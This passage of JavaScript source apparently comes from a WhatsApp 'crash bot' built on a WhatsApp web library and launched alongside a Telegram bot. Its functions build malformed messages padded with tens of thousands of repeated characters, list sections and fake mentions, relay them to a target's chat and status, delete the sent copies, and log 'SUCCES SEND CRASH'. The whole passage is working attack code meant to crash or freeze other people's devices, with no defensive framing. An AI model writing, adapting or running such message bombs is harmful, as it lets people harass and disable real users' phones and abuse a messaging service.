                buttonParamsJson: "ꦽ".repeat(10000),
              },
              {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({ status: true, }),
              },
               {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({ status: true, }),
              },
                {
                name: "camera_permission_request",
                buttonParamsJson: JSON.stringify({ "cameraAccess": true, }),
              },
            ],
            messageParamsJson: "{[".repeat(10000),
          }, 
        },
      },
    },
  };

  const [janda1, janda2] = await Promise.all([
    await sock.relayMessage(target, message, {
      messageId: "",
      participant: { jid: target },
      userJid: target
    }),
    await sock.relayMessage(target, message, {
      messageId: "",
      participant: { jid: target },
      userJid: target
    })
  ]);

  await Promise.all([
    await sock.sendMessage(target, { delete: { fromMe: true, remoteJid: target, id: janda1 } }),
    await sock.sendMessage(target, { delete: { fromMe: true, remoteJid: target, id: janda2 } })
  ]);
}

async function gladiator(target, mention = true) {
    const delaymention = Array.from({ length: 30000 }, (_, r) => ({
        title: "᭡꧈".repeat(95000),
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "𝐕‌𝐢‌𝐧‌𝐜‌𝐞‌𝐧‌𝐭 ⍣᳟ 𝐆‌𝐞‌𝐭𝐒‌𝐮𝐙𝐨༑⃟⃟🎭",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "🔴" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => 
                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                        ),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "333333333333@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "𝐕‌𝐢‌𝐧‌𝐜‌𝐞‌𝐧‌𝐭 ⍣᳟ 𝐆‌𝐞‌𝐭𝐒‌𝐮𝐙𝐨༑⃟⃟🎭"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(target, MSG, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await sock.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "Xiee-leee🕸️" },
                        content: undefined
                    }
                ]
            }
        );
    }
    console.log(chalk.bold.red('SUCCES SEND CRASH'));
}

// --- Jalankan Bot ---

(async () => {
  console.clear();
  console.log("🚀 Memulai sesi WhatsApp...");
  startSesi();

  console.log("Sukses connected");
  bot.launch();
  // Membersihkan konsol sebelum menampilkan pesan sukses
  console.clear();
  console.log(
    chalk.bold.white(`\n

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`)
  );
})();

